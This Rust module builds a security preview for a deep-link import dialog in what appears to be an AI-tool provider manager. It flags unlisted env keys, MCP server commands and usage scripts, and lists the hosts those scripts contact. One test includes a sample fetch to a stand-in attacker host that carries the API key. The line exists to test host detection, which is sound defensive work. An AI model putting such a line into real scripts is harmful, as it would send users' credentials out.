//! Import preview for the deep link confirm dialog
//!
//! Builds a structured description of what an import would write, so the
//! dialog can show env keys flagged by the allow-list, MCP server commands,
//! the usage-script source and the hosts it talks to, the live files that
//! change, and a diff against an existing provider with the same name.

use super::mcp::parse_mcp_apps;
use super::provider::{
    build_provider_from_request, classify_claude_env_key, parse_and_merge_config, ClaudeEnvKeyClass,
};
use super::utils::{decode_base64_param, infer_homepage_from_endpoint};
use super::DeepLinkImportRequest;
use crate::error::AppError;
use crate::provider::Provider;
use crate::store::AppState;
use crate::AppType;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::path::PathBuf;
use std::str::FromStr;

/// An item the user must explicitly acknowledge before importing.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum PreviewRisk {
    /// Claude env keys outside the allow-list (reach hooks and child processes)
    UnlistedEnv,
    /// MCP servers that launch a local command
    McpCommand,
    /// A usage script that can send the provider's credentials to any host
    UsageScript,
}

/// Structured preview returned by `preview_deeplink_import`.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct DeepLinkImportPreview {
    /// The request after merging its inline config (same as `merge_deeplink_config`)
    pub request: DeepLinkImportRequest,
    /// Claude env keys that are imported but not on the allow-list
    pub unlisted_env_keys: Vec<String>,
    /// Claude env keys that are dropped on import
    pub denied_env_keys: Vec<String>,
    /// MCP servers carried by an `mcp` link
    pub mcp_servers: Vec<PreviewMcpServer>,
    /// Usage script carried by a `provider` link
    #[serde(skip_serializing_if = "Option::is_none")]
    pub usage_script: Option<PreviewUsageScript>,
    /// Live config files the import writes (or writes once the provider is switched to)
    pub live_files: Vec<String>,
    /// Whether `live_files` are written by the import itself
    pub writes_live_on_import: bool,
    /// Existing provider of the same app with the same name, if any
    #[serde(skip_serializing_if = "Option::is_none")]
    pub existing: Option<PreviewExistingProvider>,
    /// Items that require an explicit acknowledgement before import
    pub risks: Vec<PreviewRisk>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct PreviewMcpServer {
    pub id: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub command: Option<String>,
    pub args: Vec<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub url: Option<String>,
    /// Full server spec as carried by the link
    pub spec: Value,
    /// A server with this id already exists: only its app flags are merged and
    /// the spec shown here is NOT written.
    pub exists: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct PreviewUsageScript {
    /// Full decoded source
    pub code: String,
    /// Hosts the script targets (literal URLs plus the `{{baseUrl}}` host)
    pub target_hosts: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct PreviewExistingProvider {
    pub id: String,
    pub name: String,
    pub is_current: bool,
    /// Fields whose value differs between the existing provider and the import
    pub changes: Vec<PreviewFieldChange>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct PreviewFieldChange {
    pub field: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub before: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub after: Option<String>,
}

/// Build the confirm-dialog preview for a deep link request.
///
/// Values are returned unmasked; the dialog masks secrets before display.
pub fn preview_deeplink_import(
    state: &AppState,
    request: &DeepLinkImportRequest,
) -> Result<DeepLinkImportPreview, AppError> {
    let merged = parse_and_merge_config(request)?;
    let mut preview = DeepLinkImportPreview {
        request: merged.clone(),
        unlisted_env_keys: Vec::new(),
        denied_env_keys: Vec::new(),
        mcp_servers: Vec::new(),
        usage_script: None,
        live_files: Vec::new(),
        writes_live_on_import: false,
        existing: None,
        risks: Vec::new(),
    };

    match merged.resource.as_str() {
        "provider" => fill_provider_preview(state, &merged, &mut preview)?,
        "mcp" => fill_mcp_preview(state, &merged, &mut preview)?,
        _ => {}
    }

    Ok(preview)
}

fn fill_provider_preview(
    state: &AppState,
    request: &DeepLinkImportRequest,
    preview: &mut DeepLinkImportPreview,
) -> Result<(), AppError> {
    let Some(app_type) = request
        .app
        .as_deref()
        .and_then(|app| AppType::from_str(app).ok())
    else {
        return Ok(());
    };

    if matches!(app_type, AppType::Claude | AppType::ClaudeDesktop) {
        for key in raw_claude_config_env_keys(request) {
            match classify_claude_env_key(&key) {
                ClaudeEnvKeyClass::Allowed => {}
                ClaudeEnvKeyClass::Denied => preview.denied_env_keys.push(key),
                ClaudeEnvKeyClass::Unlisted => preview.unlisted_env_keys.push(key),
            }
        }
    }
    if !preview.unlisted_env_keys.is_empty() {
        preview.risks.push(PreviewRisk::UnlistedEnv);
    }

    if let Some(script_b64) = &request.usage_script {
        let decoded = decode_base64_param("usage_script", script_b64)?;
        let code = String::from_utf8(decoded)
            .map_err(|e| AppError::InvalidInput(format!("Invalid UTF-8 in usage_script: {e}")))?;
        if !code.trim().is_empty() {
            let base_url = request
                .usage_base_url
                .as_deref()
                .filter(|s| !s.trim().is_empty())
                .or_else(|| {
                    request
                        .endpoint
                        .as_deref()
                        .and_then(|ep| ep.split(',').next())
                })
                .map(str::trim);
            preview.usage_script = Some(PreviewUsageScript {
                target_hosts: usage_script_target_hosts(&code, base_url),
                code,
            });
            preview.risks.push(PreviewRisk::UsageScript);
        }
    }

    // Mirrors import_provider_from_deeplink: additive apps always write their
    // live config; the others only when the provider becomes current, which
    // non-allow-listed env keys always prevent.
    let current = state.db.get_current_provider(app_type.as_str())?;
    preview.writes_live_on_import = app_type.is_additive_mode()
        || (preview.unlisted_env_keys.is_empty()
            && (current.is_none() || request.enabled.unwrap_or(false)));
    preview.live_files = provider_live_files(&app_type)
        .into_iter()
        .map(|p| p.display().to_string())
        .collect();

    if let Some(name) = request.name.as_deref().map(str::trim) {
        let providers = state.db.get_all_providers(app_type.as_str())?;
        if let Some(existing) = providers.values().find(|p| p.name.trim() == name) {
            // Build the candidate like import_provider_from_deeplink does,
            // which infers the homepage from the primary endpoint when the
            // link has none.
            let mut candidate_request = request.clone();
            if candidate_request
                .homepage
                .as_deref()
                .is_none_or(|s| s.is_empty())
            {
                candidate_request.homepage = candidate_request
                    .endpoint
                    .as_deref()
                    .and_then(|ep| ep.split(',').map(str::trim).find(|e| !e.is_empty()))
                    .and_then(infer_homepage_from_endpoint);
            }
            let candidate = build_provider_from_request(&app_type, &candidate_request)?;
            preview.existing = Some(PreviewExistingProvider {
                id: existing.id.clone(),
                name: existing.name.clone(),
                is_current: current.as_deref() == Some(existing.id.as_str()),
                changes: diff_providers(existing, &candidate),
            });
        }
    }

    Ok(())
}

fn fill_mcp_preview(
    state: &AppState,
    request: &DeepLinkImportRequest,
    preview: &mut DeepLinkImportPreview,
) -> Result<(), AppError> {
    let Some(config_b64) = &request.config else {
        return Ok(());
    };
    let decoded = decode_base64_param("config", config_b64)?;
    let config_str = String::from_utf8(decoded)
        .map_err(|e| AppError::InvalidInput(format!("Invalid UTF-8 in config: {e}")))?;
    let config_json: Value = serde_json::from_str(&config_str)
        .map_err(|e| AppError::InvalidInput(format!("Invalid JSON in MCP config: {e}")))?;
    let Some(servers) = config_json.get("mcpServers").and_then(|v| v.as_object()) else {
        return Ok(());
    };

    let existing = state.db.get_all_mcp_servers()?;
    for (id, spec) in servers {
        let command = spec
            .get("command")
            .and_then(|v| v.as_str())
            .map(str::to_string);
        let args = spec
            .get("args")
            .and_then(|v| v.as_array())
            .map(|arr| arr.iter().map(value_to_text).collect())
            .unwrap_or_default();
        let exists = existing.contains_key(id);
        if command.is_some() && !exists && !preview.risks.contains(&PreviewRisk::McpCommand) {
            preview.risks.push(PreviewRisk::McpCommand);
        }
        preview.mcp_servers.push(PreviewMcpServer {
            id: id.clone(),
            command,
            args,
            url: spec.get("url").and_then(|v| v.as_str()).map(str::to_string),
            spec: spec.clone(),
            exists,
        });
    }

    if let Some(apps) = request.apps.as_deref().and_then(|a| parse_mcp_apps(a).ok()) {
        preview.writes_live_on_import = true;
        preview.live_files = apps
            .enabled_apps()
            .iter()
            .filter_map(mcp_live_file)
            .map(|p| p.display().to_string())
            .collect();
    }

    Ok(())
}

/// Env keys of the inline Claude config before denied keys are dropped.
fn raw_claude_config_env_keys(request: &DeepLinkImportRequest) -> Vec<String> {
    let Some(config_b64) = request.config.as_ref() else {
        return Vec::new();
    };
    if request.config_format.as_deref().unwrap_or("json") != "json" {
        return Vec::new();
    }
    decode_base64_param("config", config_b64)
        .ok()
        .and_then(|bytes| serde_json::from_slice::<Value>(&bytes).ok())
        .and_then(|value| {
            value
                .get("env")
                .and_then(|v| v.as_object())
                .map(|env| env.keys().cloned().collect())
        })
        .unwrap_or_default()
}

/// Hosts a usage script talks to: hosts of literal `http(s)://` URLs in the
/// source, plus the host substituted for `{{baseUrl}}`.
fn usage_script_target_hosts(code: &str, base_url: Option<&str>) -> Vec<String> {
    let mut hosts: Vec<String> = Vec::new();
    let mut push = |host: String| {
        if !hosts.contains(&host) {
            hosts.push(host);
        }
    };

    if code.contains("{{baseUrl}}") {
        if let Some(host) = base_url.and_then(url_host) {
            push(host);
        }
    }

    let pattern = regex::Regex::new(r#"https?://[^\s"'`<>()\\]+"#).expect("valid URL regex");
    for found in pattern.find_iter(code) {
        if let Some(host) = url_host(found.as_str()) {
            push(host);
        }
    }
    hosts
}

fn url_host(raw: &str) -> Option<String> {
    let parsed = url::Url::parse(raw.trim()).ok()?;
    let host = parsed.host_str()?;
    if host.contains("{{") {
        return None;
    }
    Some(match parsed.port() {
        Some(port) => format!("{host}:{port}"),
        None => host.to_string(),
    })
}

/// Live config files a provider of `app_type` is written to.
fn provider_live_files(app_type: &AppType) -> Vec<PathBuf> {
    match app_type {
        AppType::Claude => vec![crate::config::get_claude_settings_path()],
        AppType::ClaudeDesktop => Vec::new(),
        AppType::Codex => vec![
            crate::codex_config::get_codex_auth_path(),
            crate::codex_config::get_codex_config_path(),
        ],
        AppType::Gemini => vec![
            crate::gemini_config::get_gemini_env_path(),
            crate::gemini_config::get_gemini_settings_path(),
        ],
        AppType::GrokBuild => vec![crate::grok_config::get_grok_config_path()],
        AppType::OpenCode => vec![crate::opencode_config::get_opencode_config_path()],
        AppType::OpenClaw => vec![crate::openclaw_config::get_openclaw_config_path()],
        AppType::Hermes => vec![crate::hermes_config::get_hermes_config_path()],
    }
}

/// Live config file MCP servers of `app_type` are synced to.
fn mcp_live_file(app_type: &AppType) -> Option<PathBuf> {
    match app_type {
        AppType::Claude => Some(crate::config::get_claude_mcp_path()),
        AppType::Codex => Some(crate::codex_config::get_codex_config_path()),
        AppType::Gemini => Some(crate::gemini_config::get_gemini_settings_path()),
        AppType::GrokBuild => Some(crate::grok_config::get_grok_config_path()),
        AppType::OpenCode => Some(crate::opencode_config::get_opencode_config_path()),
        AppType::Hermes => Some(crate::hermes_config::get_hermes_config_path()),
        AppType::ClaudeDesktop | AppType::OpenClaw => None,
    }
}

/// Field-level differences between the existing provider and the one the
/// link would create. Settings are flattened to dotted paths
/// (`settingsConfig.env.ANTHROPIC_BASE_URL`).
fn diff_providers(existing: &Provider, candidate: &Provider) -> Vec<PreviewFieldChange> {
    let before = provider_fields(existing);
    let after = provider_fields(candidate);

    let mut fields: Vec<&String> = before.iter().map(|(k, _)| k).collect();
    for (k, _) in &after {
        if !fields.contains(&k) {
            fields.push(k);
        }
    }

    let lookup = |list: &[(String, String)], field: &str| {
        list.iter()
            .find(|(k, _)| k == field)
            .map(|(_, v)| v.clone())
    };

    fields
        .into_iter()
        .filter_map(|field| {
            let b = lookup(&before, field);
            let a = lookup(&after, field);
            (b != a).then(|| PreviewFieldChange {
                field: field.clone(),
                before: b,
                after: a,
            })
        })
        .collect()
}

fn provider_fields(provider: &Provider) -> Vec<(String, String)> {
    let mut out = Vec::new();
    flatten_value("settingsConfig", &provider.settings_config, &mut out);
    let optional = [
        ("websiteUrl", &provider.website_url),
        ("notes", &provider.notes),
        ("icon", &provider.icon),
    ];
    for (field, value) in optional {
        if let Some(v) = value.as_ref().filter(|v| !v.is_empty()) {
            out.push((field.to_string(), v.clone()));
        }
    }
    if let Some(script) = provider.meta.as_ref().and_then(|m| m.usage_script.as_ref()) {
        if !script.code.is_empty() {
            out.push(("usageScript.code".to_string(), script.code.clone()));
        }
        out.push((
            "usageScript.enabled".to_string(),
            script.enabled.to_string(),
        ));
        if let Some(base_url) = &script.base_url {
            out.push(("usageScript.baseUrl".to_string(), base_url.clone()));
        }
        if let Some(api_key) = &script.api_key {
            out.push(("usageScript.apiKey".to_string(), api_key.clone()));
        }
    }
    out
}

fn flatten_value(prefix: &str, value: &Value, out: &mut Vec<(String, String)>) {
    match value {
        Value::Object(map) if !map.is_empty() => {
            for (key, child) in map {
                flatten_value(&format!("{prefix}.{key}"), child, out);
            }
        }
        Value::Null => {}
        other => out.push((prefix.to_string(), value_to_text(other))),
    }
}

fn value_to_text(value: &Value) -> String {
    match value {
        Value::String(s) => s.clone(),
        other => other.to_string(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn usage_script_hosts_include_literal_urls_and_base_url() {
        let code = r#"({ request: { url: "{{baseUrl}}/v1/usage" }, extra: fetch("https://evil.example.com:8443/collect?k={{apiKey}}") })"#;
        let hosts = usage_script_target_hosts(code, Some("https://api.relay.example/v1"));
        assert_eq!(
            hosts,
            vec![
                "api.relay.example".to_string(),
                "evil.example.com:8443".to_string()
            ]
        );
    }

    #[test]
    fn usage_script_hosts_skip_base_url_when_unused() {
        let hosts = usage_script_target_hosts("({})", Some("https://api.relay.example"));
        assert!(hosts.is_empty());
    }

    #[test]
    fn flatten_skips_null_and_expands_objects() {
        let mut out = Vec::new();
        flatten_value(
            "settingsConfig",
            &serde_json::json!({ "env": { "A": "1", "B": 2 }, "x": null }),
            &mut out,
        );
        assert_eq!(
            out,
            vec![
                ("settingsConfig.env.A".to_string(), "1".to_string()),
                ("settingsConfig.env.B".to_string(), "2".to_string()),
            ]
        );
    }
}
